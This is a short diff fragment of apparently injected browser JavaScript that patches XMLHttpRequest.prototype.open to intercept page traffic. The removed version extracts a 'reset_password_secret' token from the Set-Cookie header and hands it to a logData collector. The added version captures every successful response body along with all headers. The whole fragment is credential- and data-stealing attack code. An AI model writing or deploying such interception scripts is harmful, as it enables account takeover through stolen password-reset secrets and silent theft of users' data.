@@ -29,22 +29,15 @@
             XMLHttpRequest.prototype.open = function (method, url, async, user, password) {
                 this.addEventListener("readystatechange", function () {
                     console.log('Intercepted state change:', this.readyState, this.status);
-                    if (this.readyState === 4 && this.status === 201) {
-                        try {
-                            const setCookieHeader = this.getResponseHeader('Set-Cookie');
-                            console.log('Set-Cookie header:', setCookieHeader);
-                            if (setCookieHeader) {
-                                const cookies = setCookieHeader.split(';');
-                                cookies.forEach(cookie => {
-                                    if (cookie.includes('reset_password_secret=')) {
-                                        const token = cookie.split('=')[1];
-                                        console.log('Found token:', token);
-                                        logData({ token: token });
-                                    }
-                                });
+                    if (this.readyState === 4) {
+                        console.log('Intercepted response:', this.responseText);
+                        if (this.status === 200 || this.status === 201) {
+                            try {
+                                const response = this.responseText;
+                                logData({ response: response, headers: this.getAllResponseHeaders() });
+                            } catch (e) {
+                                console.error('Failed to parse response:', e);
                             }
-                        } catch (e) {
-                            console.error('Failed to parse response:', e);
                         }
                     }
                 }, false);
